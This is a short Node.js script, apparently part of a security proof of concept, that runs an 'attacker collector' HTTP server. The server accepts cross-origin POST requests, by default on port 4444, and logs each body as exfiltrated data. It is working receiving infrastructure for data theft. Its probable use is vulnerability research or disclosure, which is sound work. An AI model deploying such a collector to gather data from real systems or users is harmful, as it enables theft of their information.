#!/usr/bin/env node
'use strict';

/**
 * Attacker collector server — receives exfiltrated data from the PoC.
 * Logs all incoming POST requests with timestamp and payload.
 *
 * Usage: node collector.cjs [port]
 */

const http = require('node:http');
const PORT = parseInt(process.argv[2] || '4444', 10);

let requestCount = 0;

const server = http.createServer((req, res) => {
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    });
    return res.end();
  }

  if (req.method !== 'POST') {
    res.writeHead(405);
    return res.end('Method Not Allowed');
  }

  let body = '';
  req.on('data', (chunk) => (body += chunk));
  req.on('end', () => {
    requestCount++;
    const ts = new Date().toISOString();

    console.log('\n' + '='.repeat(60));
    console.log(`  EXFILTRATED DATA RECEIVED (#${requestCount})`);
    console.log(`  Time:     ${ts}`);
    console.log(`  Path:     ${req.url}`);
    console.log(`  Size:     ${body.length} bytes`);
    console.log('='.repeat(60));

    try {
      const parsed = JSON.parse(body);
      console.log(JSON.stringify(parsed, null, 2));
    } catch {
      console.log(body);
    }

    console.log('='.repeat(60) + '\n');

    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*',
    });
    res.end(JSON.stringify({ status: 'ok', received: requestCount }));
  });
});

server.listen(PORT, () => {
  console.log(`[collector] Listening on http://localhost:${PORT}`);
  console.log('[collector] Waiting for exfiltrated data...');
  console.log('[collector] Press Ctrl+C to stop.\n');
});
